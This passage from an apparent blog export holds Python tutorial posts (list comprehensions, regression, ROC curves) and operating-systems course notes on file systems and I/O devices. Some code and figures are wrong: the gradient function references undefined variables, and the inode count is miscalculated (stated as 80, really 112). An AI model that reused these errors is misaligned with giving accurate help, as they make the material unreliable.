  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">x = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">y = copy.deepcopy(x)</span><br><span class="line">x[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span>     <span class="comment"># y = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="列表推導式"><a href="#列表推導式" class="headerlink" title="列表推導式"></a>列表推導式</h2><h3 id="基本語法"><a href="#基本語法" class="headerlink" title="基本語法"></a>基本語法</h3><ul>
<li><code>[expression for target in iterable]</code></li>
<li><code>for target in iterable</code> - 獲得列表的每一個元素</li>
<li><code>expression</code> - 表達式，對每一個元素統一進行修改</li>
<li>具體編碼：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">x = [i * <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> x]      <span class="comment"># [2, 4, 6, 8, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    x[i] *= <span class="number">2</span>               <span class="comment"># [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="其他範例"><a href="#其他範例" class="headerlink" title="其他範例"></a>其他範例</h3><ol>
<li><p>將字符串的字符轉為<code>Unicode</code>編碼並存儲到列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;Hello&#x27;</span>]     <span class="comment"># [72, 101, 108, 108, 111]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>提取二維列表中第二列(second column)的元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">sec_col = [row[<span class="number">1</span>] <span class="keyword">for</span> row <span class="keyword">in</span> matrix]    <span class="comment"># [2, 5, 8]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>提取二維列表中對角線上的元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">diag1 = [matrix[i][i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]   <span class="comment"># [1, 5, 9]</span></span><br><span class="line">diag2 = [matrix[i][(<span class="built_in">len</span>(matrix) - <span class="number">1</span>) - i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]   <span class="comment"># [3, 5, 7]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>列表推導式創建列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">S[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>     <span class="comment"># 0 0 0</span></span><br><span class="line">                <span class="comment"># 0 1 0</span></span><br><span class="line">                <span class="comment"># 0 0 0</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="列表推導式條件語句"><a href="#列表推導式條件語句" class="headerlink" title="列表推導式條件語句"></a>列表推導式條件語句</h3><ul>
<li><code>[expression for target in iterable if condition]</code></li>
<li><code>if condition</code> - 用於篩選的條件語句</li>
<li>具體編碼：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">even = [i <span class="keyword">for</span> i <span class="keyword">in</span> x <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]     <span class="comment"># [2, 4, 6, 8, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = [<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;Tina&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;Tony&#x27;</span>, <span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Tom&#x27;</span>]</span><br><span class="line">t = [name <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">str</span> <span class="keyword">if</span> name[<span class="number">0</span>] == <span class="string">&#x27;T&#x27;</span>]    <span class="comment"># [&#x27;Tina&#x27;, &#x27;Tony&#x27;, &#x27;Tom&#x27;]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="嵌套的列表推導式"><a href="#嵌套的列表推導式" class="headerlink" title="嵌套的列表推導式"></a>嵌套的列表推導式</h3><ul>
<li><p>語法：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[expression <span class="keyword">for</span> target1 <span class="keyword">in</span> iterable1</span><br><span class="line">            <span class="keyword">for</span> target2 <span class="keyword">in</span> iterable2</span><br><span class="line">                        ...         </span><br><span class="line">            <span class="keyword">for</span> targetN <span class="keyword">in</span> iterableN]</span><br></pre></td></tr></table></figure>
</li>
<li><p>將二維列表降級為一維列表：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表推導式實現</span></span><br><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">flatten = [col <span class="keyword">for</span> row <span class="keyword">in</span> matrix <span class="keyword">for</span> col <span class="keyword">in</span> row]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循環實現</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> matrix:</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        flatten.append(col)</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python - Regression</title>
    <url>/myBlog/2022/09/30/2022/2022-9-30-PS-Py-LinearRegression/</url>
    <content><![CDATA[<h1 id="Linear-Regression-Curve"><a href="#Linear-Regression-Curve" class="headerlink" title="Linear Regression Curve"></a>Linear Regression Curve</h1><ol>
<li><p>Import modules</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> statistics <span class="keyword">import</span> variance</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"></span><br><span class="line">np.set_printoptions(suppress=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Import data through <code>pandas</code></p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">train_data = pd.read_csv(<span class="string">&quot;train_data.csv&quot;</span>)</span><br><span class="line">X_train = np.array(train_data[<span class="string">&#x27;x&#x27;</span>].tolist())</span><br><span class="line">y_train = np.array(train_data[<span class="string">&#x27;y&#x27;</span>].tolist())</span><br><span class="line"></span><br><span class="line">test_data = pd.read_csv(<span class="string">&quot;test_data.csv&quot;</span>)</span><br><span class="line">X_test = test_data[<span class="string">&#x27;x&#x27;</span>].tolist()</span><br><span class="line">y_test = test_data[<span class="string">&#x27;y&#x27;</span>].tolist()</span><br></pre></td></tr></table></figure>

</li>
<li><p>Compute the optimal theta based on the formula: $$\hat{\theta} &#x3D; (X^TX)^{-1}X^TY$$.</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">optimalTheta</span>(<span class="params">X, y</span>):</span><br><span class="line">    <span class="keyword">return</span> np.matmul(np.matmul(np.linalg.inv(np.matmul(X.transpose(), X)), X.transpose()), y)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Sketch the curve using <code>matplotlib.pyplot</code></p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sketchGraph</span>(<span class="params">theta, color</span>):</span><br><span class="line">    plt.scatter(X_train, y_train)</span><br><span class="line">    i = np.linspace(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> dimension <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(theta)):</span><br><span class="line">        j += theta[dimension] * <span class="built_in">pow</span>(i, dimension)</span><br><span class="line">        </span><br><span class="line">    plt.plot(i, j, color)</span><br><span class="line">    plt.xlim(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">    plt.ylim(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="Logistic-Regression"><a href="#Logistic-Regression" class="headerlink" title="Logistic Regression"></a>Logistic Regression</h1><ol>
<li><p>Set up the logistic model</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Logistic Model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">computeError</span>(<span class="params">theta</span>):</span><br><span class="line">    lm = [<span class="number">1</span>/(<span class="number">1</span> + np.exp(-(np.matmul(X_train[i].transpose(), theta)))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_train))]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prediction Accuracy</span></span><br><span class="line">    p = [lm[i] ** y_train[i] * (<span class="number">1</span> - lm[i]) ** (<span class="number">1</span> - y_train[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_train))]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Maximum Likelihood Estimation</span></span><br><span class="line">    E = -<span class="number">1</span> * <span class="built_in">sum</span>([np.log(p[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_train))])</span><br><span class="line">    <span class="keyword">return</span> E</span><br></pre></td></tr></table></figure>

</li>
<li><p>Computing the gradient</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compGradient</span>(<span class="params">X, theta</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">X, theta</span>):</span><br><span class="line">        partialDe0 = [(<span class="number">1</span> - y_train[i] - math.exp(-<span class="number">1</span> * np.matmul(X[i].transpose(), theta)) / (<span class="number">1</span> + math.exp(-<span class="number">1</span> * np.matmul(X[i].transpose(), theta)))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">        <span class="keyword">return</span> [partialDe0, partialDe1, partialDe2]</span><br><span class="line"></span><br><span class="line">    de = de(X_train, theta)</span><br><span class="line"></span><br><span class="line">    gradient = <span class="built_in">sum</span>(de)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [gradient]</span><br></pre></td></tr></table></figure>

</li>
<li><p>Computing the iteraction</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">lr = <span class="number">1</span>      <span class="comment"># learning rate</span></span><br><span class="line">theta = np.array([-<span class="number">2.5</span>, <span class="number">6.0</span>, <span class="number">0.5</span>])  <span class="comment"># initial theta</span></span><br><span class="line">gradient = np.array([<span class="number">0.723</span>, <span class="number">0.084</span>, <span class="number">0.433</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    theta = theta - gradient * lr</span><br><span class="line">    E = computeError(theta)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Iteration&#x27;</span>, i + <span class="number">1</span>, <span class="string">&#x27;=&#x27;</span>, [E])</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python - ROC Curve</title>
    <url>/myBlog/2022/09/30/2022/2022-9-30-PS-Py-ROCCurve/</url>
    <content><![CDATA[<h1 id="ROC-Curve-Plotter"><a href="#ROC-Curve-Plotter" class="headerlink" title="ROC Curve Plotter"></a>ROC Curve Plotter</h1><ol>
<li><p>Import modules</p>
<ul>
<li>Using <code>sklearn</code> to plot the ROC Curve <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score, confusion_matrix, roc_auc_score, roc_curve</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Plot curve</p>
<ul>
<li>get the <font color="#3A75EA">false positive rate</font>, <font color="#3A75EA">true positive rate</font> and <font color="#3A75EA">thresholds</font> by inputting the passing coordinates. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get the require elements</span></span><br><span class="line">fpr, tpr, thresholds = roc_curve([<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>], [<span class="number">0.56</span>, <span class="number">0.61</span>, <span class="number">0.43</span>, <span class="number">0.78</span>, <span class="number">0.12</span>, <span class="number">0.47</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># sketch the coordinates</span></span><br><span class="line">plt.scatter([<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>/<span class="number">3</span>, <span class="number">1</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># plot the curve</span></span><br><span class="line">plt.plot(fpr, tpr)</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;False Positive Rate&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True Positive Rate&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;model 1 AUC score: <span class="subst">&#123;roc_auc_score([<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>], [<span class="number">0.56</span>, <span class="number">0.61</span>, <span class="number">0.43</span>, <span class="number">0.78</span>, <span class="number">0.12</span>, <span class="number">0.47</span>])&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<!-- <font color="#3A75EA"><font/> -->]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Presistence (File System Implementation)</title>
    <url>/myBlog/2022/10/14/2022/CSCI3150/2022-10-14-CSCI3150-Presistence-FileSystemImplementation/</url>
    <content><![CDATA[<h2 id="Overall-Organization"><a href="#Overall-Organization" class="headerlink" title="Overall Organization"></a>Overall Organization</h2><ol>
<li><p><strong>On-Disk Organization</strong></p>
<ul>
<li>a series of blocks (e.g. size of each block is 4KB).</li>
<li>the blocks are addressed from 0 to N-1.</li>
</ul>
</li>
<li><p><strong>File System Organization</strong></p>
<ol>
<li><p><font color="#F54747"><strong>Metadata Region</strong></font>: tracks data and file system information</p>
<ol>
<li><p><font color="#F54747">Inode Table</font>:  the collection of all inodes</p>
<ul>
<li>There are 3 to 7 blocks for inode tables and each inode size is 256 bytes.</li>
<li>The file system can contain $ \frac{4 \cdot 7 \cdot 1024}{256} $ &#x3D; 80 inodes (i.e. maximum number of files).</li>
</ul>
</li>
<li><p><font color="#F54747">Bitmap</font>: to track whether inodes or data blocks are free or allocated</p>
<ul>
<li><font color="#3A75EA">data bitmap</font>: for data blocks in data region</li>
<li><font color="#3A75EA">inode bitmap</font>: for inode table</li>
</ul>
</li>
<li><p><font color="#F54747">Superblock</font>: tracks a file system</p>
<ul>
<li>It contains the <font color="#3A75EA">information</font> for the particular file system (e.g. the number of inodes, the begin location of inode table).</li>
</ul>
</li>
</ol>
</li>
<li><p><font color="#F54747"><strong>Data Region</strong></font>: stores user data and occupies most space</p>
</li>
</ol>
 <img src="https://p.ipic.vip/mvkrfc.png" width="500px" /></li>
</ol>
<h2 id="File-Organization"><a href="#File-Organization" class="headerlink" title="File Organization"></a>File Organization</h2><h3 id="Inode"><a href="#Inode" class="headerlink" title="Inode"></a>Inode</h3><ol>
<li><p>Inode</p>
<ul>
<li>Contains all the information about a file.</li>
<li>e.g. file type, size, protection information, time information, etc.</li>
</ul>
</li>
<li><p><strong><font color="#F54747">Direct Pointers</font></strong>: points to a data block explicitly</p>
<ul>
<li>Design of inode: <mark>How it refers to where data blocks are</mark>.</li>
<li>File system calculate where the data block that the inode refers to.</li>
<li>For example, given an inode number 32, calculate the offset into the inode region (32 $\times$ sizeof(inode)) &#x3D; 8192. Then, adding the start address of the inode table (12KB) + inode region (8KB) &#x3D; 20 KB and we can get the location of data block. <img src="https://p.ipic.vip/4m97x2.png" width="500px" /></li>
</ul>
</li>
<li><p>Storage</p>
 <img src="https://p.ipic.vip/d854yi.png" width="500px" />

<ul>
<li>The size of an inode is 60 bytes, and suppose each block number is 4 bytes, so we can store 15 blocks in total.<br> Suppose each data block is 4KB, the maximum file size is 15 $\times$ 4 &#x3D; 60KB.</li>
<li>Therefore, it is hard to support files of big sizes.</li>
</ul>
</li>
</ol>
<h3 id="Multi-Level-Index"><a href="#Multi-Level-Index" class="headerlink" title="Multi-Level Index"></a>Multi-Level Index</h3><ol>
<li><p><strong><font color="#F54747">Indirect Pointer</font></strong>: points to a block that contains (multiple) pointers to data blocks</p>
<ul>
<li>The maximum file size &#x3D; (12 + 1024) $\times$ 4KB $\approx$ 4MB.</li>
<li>Because each inode is 4 bytes and each block is 4KB, so we can hold 1024 inodes, then the file size is 1K $\times$ 4KB &#x3D; 4MB.</li>
</ul>
</li>
<li><p><strong><font color="#F54747">Double Indirect Pointer</font></strong>: points to pointers to indirect blocks</p>
<ul>
<li>The maximum file size &#x3D; (12 + 1024 $\times$ 1024) $\times$ 4KB $\approx$ 1 million 4KB blocks.</li>
</ul>
</li>
<li><p><strong><font color="#F54747">Triple Indirect Pointer</font></strong>: points to pointers to pointers to indirect block</p>
<ul>
<li>The maximum file size &#x3D; (12 + 1024 + 1024$^2$) $\times$ 4KB $\approx$ 4GB.</li>
</ul>
</li>
</ol>
<h2 id="Directory-Organization"><a href="#Directory-Organization" class="headerlink" title="Directory Organization"></a>Directory Organization</h2><ol>
<li><p>Directory</p>
<ul>
<li>Directory contains a list of (entry name, inode number) pairs.</li>
<li>Each directory has two extra file: <ul>
<li><code>.</code> : current directory</li>
<li><code>..</code> : parent directory</li>
</ul>
</li>
<li>For example: <code>dir</code> has three files : <code>foo</code>, <code>bar</code>, <code>foobar_is_a_pretty_longname</code>.</li>
</ul>
</li>
<li><p>Free Space Management</p>
<ul>
<li>File system track which inode and data block are free to use.</li>
<li>Two simple bitmaps are used to manage the free space.<ul>
<li>When file is newly created, it allocated the inode by searching the inode bitmap and update on-disk bitmap.</li>
<li>Pre-allocation policy is commonly used for allocate contiguous blocks.</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="Access-Paths"><a href="#Access-Paths" class="headerlink" title="Access Paths"></a>Access Paths</h2><h3 id="Reading-File-from-Disk"><a href="#Reading-File-from-Disk" class="headerlink" title="Reading File from Disk"></a>Reading File from Disk</h3><ul>
<li><p><code>open(&quot;/foo/bar&quot;, O_RDONLY)</code></p>
<ol>
<li>Traverse the pathname and thus locate the desired inode.</li>
<li>Begin at the root of the file system (<code>/</code>).</li>
<li>File system reads in the block that contains inode number 2 (the root inode number in most Unix file system).</li>
<li>Look inside of the content of root to find pointer to data blocks.</li>
<li>By reading in one or more directory data block, and find “foo” directory finally.</li>
<li>Tranverse recursively the path name until the desired inode (“bar”).</li>
<li>Check the finale permissions (權限), allocate a file descriptor for this process and return the file descriptor.</li>
</ol>
</li>
<li><p><code>read()</code> and <code>close()</code></p>
<ol>
<li>Read in the first block of the file, consulting the inode to find the location of that block.<ul>
<li><font color="F54747">Update the inode</font> with a new last accessed time.</li>
<li><font color="F54747">Update in-memory open file table</font> for file descriptor (i.e. the file offset).</li>
</ul>
</li>
<li>When the file is closed, the file descriptor should be disallocated.<ul>
<li><font color="F54747">NO disk I&#x2F;Os take place</font>.</li>
</ul>
</li>
</ol>
</li>
<li><p>Timeline for reading file from disk:</p>
  <img src="https://p.ipic.vip/5sdw6u.png" width="700px" /></li>
</ul>
<h3 id="Writing-to-Disk"><a href="#Writing-to-Disk" class="headerlink" title="Writing to Disk"></a>Writing to Disk</h3><ul>
<li><p><code>write()</code>: update the file with new contents</p>
<ul>
<li>Need to update <font color="3A75EA">data block</font> and <font color="3A75EA">data bitmap</font>.</li>
<li>Generates 5 I&#x2F;Os:<ol>
<li><font color="F54747">read</font> the <font color="3A75EA"> data bitmap</font></li>
<li><font color="F54747">write</font> the <font color="3A75EA"> data bitmap</font> (to reflect its new state to disk)</li>
<li><font color="F54747">read</font> the <font color="3A75EA">inode</font></li>
<li><font color="F54747">write</font> the <font color="3A75EA">inode</font></li>
<li><font color="F54747">write</font> the <font color="3A75EA">actual block</font> itself</li>
</ol>
</li>
<li>Need to allocate space or directory for creating file, it causes high I&#x2F;O traffic.</li>
</ul>
</li>
<li><p>Timeline for writing to disk:</p>
  <img src="https://p.ipic.vip/3cxwd2.png" width="700px" /></li>
</ul>
<h2 id="Caching-amp-Buffering"><a href="#Caching-amp-Buffering" class="headerlink" title="Caching &amp; Buffering"></a>Caching &amp; Buffering</h2><ol>
<li><p>Problems:</p>
<ul>
<li>Reading and writing files are expensive because it incurs many I&#x2F;Os.<ul>
<li>For example, long pathname (<code>/dir1/dir2/.../dir100/file.txt</code>)</li>
<li>It performs hundreds of reads in order to open the file (one to read the inode of the directory and at least one to read its data).</li>
</ul>
</li>
</ul>
</li>
<li><p>Solutions:</p>
<ol>
<li><p>Read &amp; Cache</p>
<ul>
<li>To reduce the I&#x2F;O traffic, file system uses system memory (DRAM) to cache.<ul>
<li>Early, file system uses fixed-size cache to hold the popular blocks, but it is wasting memory.</li>
<li>Now, model system uses <font color="3A75EA">dynamic partitioning approach</font> and <font color="3A75EA">unified page cache</font>.</li>
</ul>
</li>
<li>Thus, read I&#x2F;O can be avoided by the cache.</li>
</ul>
</li>
<li><p>Write &amp; Buffer</p>
<ul>
<li>Since write traffic has to go to the disk for persistent, cache does not reduce write I&#x2F;Os.</li>
<li>File system uses write buffering for writing performance benefits.<ul>
<li>It can delay writes such that the file system batch some updates into a smaller set of I&#x2F;Os.</li>
<li>By buffering a number of writes in memory, the file system can schedule the subsequent I&#x2F;Os.</li>
</ul>
</li>
<li>Some application force flush data to the disk by calling <code>fsync()</code> or direct I&#x2F;O.</li>
</ul>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Presistence (I/O Devices)</title>
    <url>/myBlog/2022/10/26/2022/CSCI3150/2022-10-26-CSCI3150-Presistence-IODevice/</url>
    <content><![CDATA[<h2 id="I-x2F-O-System-Architecture"><a href="#I-x2F-O-System-Architecture" class="headerlink" title="I&#x2F;O System Architecture"></a>I&#x2F;O System Architecture</h2><img src="https://p.ipic.vip/7li9ig.png" width="600px"/>

<ol>
<li><p>Buses</p>
<ul>
<li>Data paths that used to communicate information with the CPU(s), RAM and I&#x2F;O Devices.</li>
<li><font color="3A75EA">CPU</font> is attached to the <font color="3A75EA">main memory</font> of the system via a <font color="F54747">memory bus</font>.</li>
<li><font color="3A75EA">Some devices</font> are connected to the <font color="3A75EA">system</font> via a <font color="F54747">general I&#x2F;O bus</font>.</li>
</ul>
</li>
<li><p>I&#x2F;O Bus</p>
<ul>
<li>data path that connects CPU to I&#x2F;O Devices.</li>
<li>I&#x2F;O Device is connected to I&#x2F;O bus by three hardware components:<ol>
<li>I&#x2F;O ports</li>
<li>interfaces</li>
<li>device controllers</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="Canonical-Device"><a href="#Canonical-Device" class="headerlink" title="Canonical Device"></a>Canonical Device</h2><img src="https://p.ipic.vip/ofaiph.png" width="600px"/>

<h3 id="Hardware-Interface"><a href="#Hardware-Interface" class="headerlink" title="Hardware Interface"></a>Hardware Interface</h3><ul>
<li><p>Allows the system software to control its operation</p>
</li>
<li><p>Operating system can control the device behavior by reading and writing the following registers:</p>
<ol>
<li><p><font color="F54747">status register</font></p>
<ul>
<li>see the current status of the device</li>
</ul>
</li>
<li><p><font color="F54747">command register</font></p>
<ul>
<li>tell the device to perform a certain task</li>
</ul>
</li>
<li><p><font color="F54747">data register</font></p>
<ul>
<li>pass data to the device or get data from the device</li>
</ul>
</li>
</ol>
</li>
<li><p>Tipical interaction example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( STATUS == BUSY) ; <span class="comment">// wait until device is not busy</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// write data to data register</span></span><br><span class="line"><span class="comment">// write command to command register</span></span><br><span class="line">    <span class="comment">// starts the device and executes the command</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( STATUS == BUSY ) ; <span class="comment">// wait until device is done with your request</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Internals"><a href="#Internals" class="headerlink" title="Internals"></a>Internals</h3><ul>
<li>Implement the specific operations</li>
</ul>
<h2 id="General-Mechanisms"><a href="#General-Mechanisms" class="headerlink" title="General Mechanisms"></a>General Mechanisms</h2><h3 id="Polling"><a href="#Polling" class="headerlink" title="Polling"></a>Polling</h3><ul>
<li><p>Operating system waits until the device is ready by repeatedly reading the status register.</p>
</li>
<li><p>Advantages:</p>
<ul>
<li>simple and it works.</li>
</ul>
</li>
<li><p>Disadvantages:</p>
<ul>
<li>it wastes CPU time for just waiting for the device,<br>  so switching to another process during the waiting time may be a better utilize of CPU.</li>
</ul>
</li>
</ul>
<img src="https://p.ipic.vip/9dtgq2.png" width="600px"/>



<h3 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h3><ul>
<li><p>Put the I&#x2F;O request process to <font color="3A75EA">sleep</font> and context switch to another process.</p>
</li>
<li><p>When the device is finished, <font color="3A75EA">wake</font> the process (waiting for the device finished) by interrupt.</p>
</li>
<li><p>Advantages:</p>
<ul>
<li>allow CPU and the disk are properly utilized.</li>
</ul>
</li>
<li><p>Noted: interrupt is not always the best</p>
<ul>
<li>Because context switch is <font color="3A75EA">expensive</font>, if the device performs very fast, then interrupt will slow down the system.<ul>
<li>If the device is fast, then polling is the best</li>
<li>Otherwise, interrupt is the best</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="https://p.ipic.vip/wff0s5.png" width="600px"/>



<h3 id="Direct-Memory-Access"><a href="#Direct-Memory-Access" class="headerlink" title="Direct Memory Access"></a>Direct Memory Access</h3><ol>
<li><p>Problems:</p>
<ul>
<li>CPU wastes a lot of time to copy a large chunk of data from memory to the device. <img src="https://p.ipic.vip/y3hdm9.png" width="600px"/></li>
</ul>
</li>
<li><p>Solution: Direct Memory Access DMA</p>
<ul>
<li>Copy data in memory by knowing the <font color="3A75EA">location of data in memory</font> and the <font color="3A75EA">number of data block need to copy</font>.</li>
<li>When the copying finished, DMA raises an interrupt on the disk. <img src="https://p.ipic.vip/hj1xbw.png" width="600px"/></li>
</ul>
</li>
</ol>
<h2 id="Device-Interacftions"><a href="#Device-Interacftions" class="headerlink" title="Device Interacftions"></a>Device Interacftions</h2><ul>
<li>The communications between operating system and device<ol>
<li><p><font color="F54747">I&#x2F;O Instructions</font></p>
<ul>
<li>a way for the OS to send data to specific device registers</li>
<li>e.g., <code>in</code> and <code>out</code> instructions on x86.</li>
</ul>
</li>
<li><p><font color="F54747">Memory-mapped I&#x2F;O</font></p>
<ul>
<li>a specific area inside the memory for the I&#x2F;O device (those device registers are available as memory locations).</li>
<li>i.e., the OS <code>load</code> (read) and <code>store</code> (write) to the <font color="3A75EA">device</font>, instead of <font color="3A75EA">the main memory</font>.</li>
